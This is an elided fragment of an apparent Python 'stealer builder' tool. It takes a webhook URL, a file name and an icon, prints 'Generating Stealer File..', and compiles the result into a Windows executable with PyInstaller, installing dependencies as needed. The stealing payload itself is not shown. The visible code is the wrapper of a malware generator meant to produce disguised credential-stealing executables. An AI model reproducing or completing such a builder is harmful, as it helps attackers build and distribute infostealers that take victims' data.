...
try:
    ...
    if not ValidateWebhookFormat(webhook):
    ...
    filename = input(f'\n{INPUT} File Name {red}->{reset} ').strip()
    if not filename:
        ErrorInput()
                ...
                if icon_path.lower().endswith('.png'):
                    if not PIL_AVAILABLE:
                        ...
                        try:
                            ...
                            print(f'{ERROR} Failed to install Pillow:{red} {pil_err}', reset)
                            icon_path = None
                    if icon_path:
                        ...
                        try:
                            ...
                            print(f'{ERROR} Failed to convert icon:{red} {conv_err}', reset)
                            icon_path = None
                else:
    ...
    print(f'\n{LOADING} Generating Stealer File..', reset)
...
'''
    ...
    output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Output/StealerBuilder")
    ...
    def cleanup_build(temp_py, icon_path, temp_icon, output_dir, filename):
        ...
        if temp_icon and icon_path and os.path.exists(icon_path):
            ...
            try:
                ...
                pass
        _rm_tree(os.path.join(output_dir, "build"))
        _rm_tree(os.path.join(output_dir, "__pycache__"))
        try:
    ...
    def save_as_python(code, output_dir, filename, ext):
    ...
    if extension == ".exe":
        ...
        try:
            ...
            if result.returncode == 0:
                print(f"{SUCCESS} pefile installed!", reset)
            else:
        ...
        try:
            ...
            if result.returncode == 0:
                print(f"{SUCCESS} PyInstaller installed!", reset)
            else:
        ...
        try:
            ...
            if result.returncode != 0:
                ...
                save_as_python(Code, output_dir, filename, ".py")
            else:
                cleanup_build(temp_py, icon_path, temp_icon, output_dir, filename)
        ...
        save_as_python(Code, output_dir, filename, extension)
